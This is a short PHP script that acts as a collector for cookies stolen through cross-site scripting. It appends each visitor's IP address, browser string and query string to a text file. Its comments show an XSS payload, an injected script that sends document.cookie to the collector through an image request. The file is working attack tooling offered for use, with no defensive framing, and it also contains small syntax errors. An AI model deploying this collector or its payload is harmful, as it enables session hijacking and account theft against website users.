<?php

$ip = $_SERVER['REMOTE_ADDR']
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt','a');
fwrite($fp, $ip.' '.$browser." \n")
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);



#usage attacker.site/jar.php?KEY=VALUE
#e.g 
# <script> var i =new Image();
# i.src="mysite.com/jar.php?cookie="+escape(document.cookie)
# </script>
?>



